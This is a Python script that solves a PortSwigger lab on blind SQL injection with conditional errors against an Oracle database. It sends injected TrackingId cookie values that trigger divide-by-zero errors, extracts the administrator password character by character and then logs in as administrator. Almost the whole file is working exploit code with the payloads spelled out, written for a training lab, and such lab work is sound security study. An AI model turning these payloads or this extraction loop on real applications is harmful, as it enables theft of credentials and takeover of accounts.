import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
import string

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
# db: oracledb
# author: 0xyf


class SQLi12:
    def __init__(self):
        self.lab_id = "0a14001003fed31e83da7d420099000f"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.vuln_url = f"{self.url}/filter"
        self.proxies = {"https": "http://127.0.0.1:8080"}
        self.username = "administrator"

    def get_csrf_token(self):
        r = requests.get(f"{self.login_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies
        # self.cookies = {**self.cookies **r.cookies} # Combine the existing cookies with the new cookie

    def execute_request(self, payload):
        cookies = {"TrackingId": payload}
        r = requests.get(self.url, proxies=self.proxies, cookies=cookies, verify=False)
        return r

    def get_pw_len(self):
        """
        Finds the length of the password by causing a database error (status code 500)
        when the length matches the guessed value.
        """
        for i in range(1, 1001):  # Limit to a reasonable range
            print(f"Finding length of password: {i}")
            payload = (
                f"' OR 1=1 AND (SELECT CASE WHEN (LENGTH(password)={i}) "
                f"THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a' AND 'a' = 'a"
            )
            r = self.execute_request(payload)
            if r.status_code == 500:
                print(f"Password length found: {i}")
                self.pw_len = i
                return
        raise ValueError("Password length not found within range.")

    def get_pw(self):
        """
        Extracts the password character by character using SQL injection.
        """
        password = ""
        valid_chars = string.ascii_lowercase + string.digits  # Define valid characters

        for i in range(1, self.pw_len + 1):
            for char in valid_chars:
                print(f"Trying: {password}{char}")
                payload = f"' OR 1=1 AND (SELECT CASE WHEN (SUBSTR(password, {i}, 1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a"
                r = self.execute_request(payload)
                if r.status_code == 500:
                    password += char
                    print(f"Password so far: {password}")
                    break
        self.password = password

    def login(self):
        self.get_csrf_token()
        print(f"[*] Attempting to Login as {self.username}:{self.password}")
        data = {
            "username": self.username,
            "password": self.password,
            "csrf": self.csrf_token,
        }
        r = requests.post(
            self.login_url,
            cookies=self.cookies,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.get_pw_len()
        self.get_pw()
        self.login()
        self.check_solved()


def main():
    SQLi12().solve()


if __name__ == "__main__":
    main()
